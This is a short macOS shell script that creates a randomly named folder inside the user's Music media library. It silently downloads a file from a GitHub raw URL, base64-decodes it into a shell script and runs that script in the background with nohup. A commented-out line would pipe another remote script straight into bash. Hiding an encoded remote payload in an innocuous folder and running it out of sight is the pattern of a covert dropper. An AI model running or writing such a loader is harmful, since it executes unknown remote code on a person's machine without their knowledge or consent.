export random=$RANDOM
FOLDER="/Users/$USER/Music/Music/Media.localized/${random}"

mkdir -p $FOLDER
curl -s -o $FOLDER/lol.bin https://raw.githubusercontent.com/vakandi/Med_buster/master/lol.bin
#bash <(curl -s https://raw.githubusercontent.com/vakandi/Med_buster/master/Med_buster.sh)
base64 -d $FOLDER/lol.bin > $FOLDER/test.sh
nohup bash $FOLDER/test.sh $random &
